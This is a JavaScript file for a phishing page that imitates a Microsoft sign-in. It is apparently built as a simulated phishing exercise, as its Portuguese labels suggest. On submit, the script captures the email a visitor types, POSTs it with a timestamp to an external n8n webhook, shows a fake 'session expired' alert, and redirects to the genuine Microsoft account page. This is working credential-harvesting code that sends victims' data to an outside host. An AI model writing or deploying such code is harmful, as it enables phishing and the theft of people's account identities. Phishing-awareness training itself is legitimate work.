const TRACKING_URL = 'https://opiceblum.app.n8n.cloud/webhook/fc870a18-719e-4ad1-84f9-f503995fd4a4'; 
const TRAINING_URL = 'https://account.microsoft.com/account/Account?mkt=pt-BR';
const btnNext = document.querySelector(".btn-next");
const btnSigin = document.querySelector(".btn-sigin");
let emailDigitado = document.getElementById('emailInput').value;
let senhaDigitada = document.getElementById('passwordInput').value;
let dadosRastreio; 

btnNext.addEventListener('click', () => {
    console.log("teste");
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        
        loginForm.addEventListener('submit', function(event) {

            event.preventDefault(); 
            
 
            emailDigitado = document.getElementById('emailInput').value;
            

              dadosRastreio = {

                alvo_email: emailDigitado,
                
                evento: 'Tentativa_de_Login_Simulado',
                timestamp: new Date().toISOString()
            };
            

            fetch(TRACKING_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dadosRastreio)
            })
            .then(response => {
                console.log('Rastreamento de submissão enviado com sucesso.');
            })
            .catch(error => {
                console.error('Erro ao enviar dados de rastreamento:', error);
            })
            .finally(() => {
                alert("Sessão expirada. Redirecionando para a página inicial...");
                window.location.href = TRAINING_URL;
            });
        });
    }
});

btnSigin.addEventListener("click", () => {

    console.log("teste");
    
              fetch(TRACKING_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dadosRastreio)
            })
            .then(response => {
                console.log('Rastreamento de submissão enviado com sucesso.');
            })
            .catch(error => {
                console.error('Erro ao enviar dados de rastreamento:', error);
            })
            .finally(() => {
                alert("Sessão expirada. Redirecionando para a página inicial...");
                window.location.href = TRAINING_URL;
            });
})